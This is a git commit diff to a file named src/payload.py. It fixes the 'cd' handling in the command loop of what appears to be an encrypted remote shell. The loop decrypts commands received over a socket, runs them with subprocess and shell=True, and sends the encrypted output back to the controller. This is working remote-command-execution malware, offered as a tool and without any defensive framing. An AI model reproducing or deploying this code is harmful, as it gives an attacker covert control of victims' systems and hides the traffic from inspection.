4f99b9a4491d144b3a3aef48a63dee768887e23e
Lionskey <LoganGoins@protonmail.com>
2023-04-03 17:29:58 -0500

    Squashed a cd bug in payload

--- src/payload.py
+++ src/payload.py
@@ -21,19 +21,20 @@ public_partner = rsa.PublicKey.load_pkcs1(s.recv(2048))
 s.send(public_key.save_pkcs1("PEM"))
 
 while 1:
-    try:
-        data = rsa.decrypt(s.recv(1024), private_key).decode("UTF-8")
-        data = data.strip('\n')
-        if data == "quit": 
-            break
-        if data[:2] == "cd":
-            os.chdir(data[3:])
-        if len(data) > 0:
-            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
-            stdout_value = proc.stdout.read() + proc.stderr.read()
-            output_str = str(stdout_value, "UTF-8")
-            s.send(rsa.encrypt(str.encode("\n" + output_str + "\n"), public_partner))
-    except Exception as e:
-        continue
+	try:
+		data = rsa.decrypt(s.recv(1024), private_key).decode("UTF-8")
+		data = data.strip('\n')
+		if data == "quit": 
+			break
+		if data[:2] == "cd":
+			os.chdir(data[3:])
+			s.send(rsa.encrypt(str.encode("\n"), public_partner))
+		elif len(data) > 0:
+			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+			stdout_value = proc.stdout.read() + proc.stderr.read()
+			output_str = str(stdout_value, "UTF-8")
+			s.send(rsa.encrypt(str.encode("\n" + output_str + "\n"), public_partner))
+	except Exception as e:
+		continue
     
 s.close()
